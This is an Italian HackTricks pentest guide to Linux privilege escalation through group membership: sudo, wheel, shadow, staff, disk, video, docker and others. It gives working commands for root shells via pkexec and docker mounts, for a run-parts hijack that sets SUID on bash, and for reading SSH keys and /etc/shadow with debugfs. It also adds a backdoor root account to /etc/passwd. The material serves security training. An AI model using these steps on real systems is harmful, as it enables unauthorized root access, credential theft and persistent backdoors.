# Gruppi Interessanti - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Gruppi Sudo/Admin

### **PE - Metodo 1**

**A volte**, **per impostazione predefinita (o perché qualche software ne ha bisogno)** all'interno del **/etc/sudoers** file puoi trovare alcune di queste righe:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente che appartiene al gruppo sudo o admin può eseguire qualsiasi cosa come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
### PE - Metodo 2

Trova tutti i binari suid e controlla se c'è il binario **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se scopri che il binario **pkexec è un binario SUID** e appartieni a **sudo** o **admin**, probabilmente potresti eseguire binari come sudo usando `pkexec`.\
Questo perché tipicamente questi sono i gruppi all'interno della **politica polkit**. Questa politica identifica fondamentalmente quali gruppi possono utilizzare `pkexec`. Controllalo con:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e **per impostazione predefinita** in alcune distribuzioni linux i gruppi **sudo** e **admin** appaiono.

Per **diventare root puoi eseguire**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se provi a eseguire **pkexec** e ricevi questo **errore**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Non è perché non hai permessi, ma perché non sei connesso senza una GUI**. E c'è una soluzione per questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Gruppo Wheel

**A volte**, **per impostazione predefinita** all'interno del **/etc/sudoers** file puoi trovare questa riga:
```
%wheel	ALL=(ALL:ALL) ALL
```
Questo significa che **qualsiasi utente che appartiene al gruppo wheel può eseguire qualsiasi cosa come sudo**.

Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
```
sudo su
```
## Shadow Group

Gli utenti del **gruppo shadow** possono **leggere** il file **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, leggi il file e prova a **crackare alcuni hash**.

## Gruppo Staff

**staff**: Consente agli utenti di aggiungere modifiche locali al sistema (`/usr/local`) senza necessitare di privilegi di root (nota che gli eseguibili in `/usr/local/bin` sono nella variabile PATH di qualsiasi utente e possono "sovrascrivere" gli eseguibili in `/bin` e `/usr/bin` con lo stesso nome). Confronta con il gruppo "adm", che è più legato al monitoraggio/sicurezza. [\[source\]](https://wiki.debian.org/SystemGroups)

Nelle distribuzioni debian, la variabile `$PATH` mostra che `/usr/local/` verrà eseguita con la massima priorità, sia che tu sia un utente privilegiato o meno.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Se riusciamo a dirottare alcuni programmi in `/usr/local`, possiamo facilmente ottenere i privilegi di root.

Dirottare il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
o Quando si effettua il login in una nuova sessione ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Sfruttare**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Questo privilegio è quasi **equivalente all'accesso root** poiché puoi accedere a tutti i dati all'interno della macchina.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Nota che usando debugfs puoi anche **scrivere file**. Ad esempio, per copiare `/tmp/asd1.txt` in `/tmp/asd2.txt` puoi fare:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Tuttavia, se provi a **scrivere file di proprietà di root** (come `/etc/shadow` o `/etc/passwd`) riceverai un errore di "**Permesso negato**".

## Video Group

Utilizzando il comando `w` puoi scoprire **chi è connesso al sistema** e mostrerà un output simile al seguente:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Il **tty1** significa che l'utente **yossi è connesso fisicamente** a un terminale sulla macchina.

Il **gruppo video** ha accesso per visualizzare l'output dello schermo. Fondamentalmente puoi osservare gli schermi. Per fare ciò, devi **catturare l'immagine attuale sullo schermo** in dati grezzi e ottenere la risoluzione che lo schermo sta utilizzando. I dati dello schermo possono essere salvati in `/dev/fb0` e puoi trovare la risoluzione di questo schermo in `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Per **aprire** l'**immagine raw** puoi usare **GIMP**, selezionare il file **`screen.raw`** e selezionare come tipo di file **Raw image data**:

![](<../../../images/image (463).png>)

Poi modifica la Larghezza e l'Altezza a quelle utilizzate sullo schermo e controlla diversi Tipi di Immagine (e seleziona quello che mostra meglio lo schermo):

![](<../../../images/image (317).png>)

## Gruppo Root

Sembra che per impostazione predefinita i **membri del gruppo root** possano avere accesso a **modificare** alcuni file di configurazione dei **servizi** o alcuni file di **librerie** o **altre cose interessanti** che potrebbero essere utilizzate per escalare i privilegi...

**Controlla quali file i membri root possono modificare**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Gruppo Docker

Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, così quando l'istanza si avvia carica immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:

{{#ref}}
../docker-security/
{{#endref}}

Se hai permessi di scrittura sul socket docker leggi [**questo post su come elevare i privilegi abusando del socket docker**](../index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Gruppo lxc/lxd

{{#ref}}
./
{{#endref}}

## Gruppo Adm

Di solito i **membri** del gruppo **`adm`** hanno permessi per **leggere i file di log** situati in _/var/log/_.\
Pertanto, se hai compromesso un utente all'interno di questo gruppo dovresti sicuramente dare un **occhiata ai log**.

## Gruppo Auth

All'interno di OpenBSD il gruppo **auth** di solito può scrivere nelle cartelle _**/etc/skey**_ e _**/var/db/yubikey**_ se vengono utilizzate.\
Questi permessi possono essere abusati con il seguente exploit per **elevare i privilegi** a root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
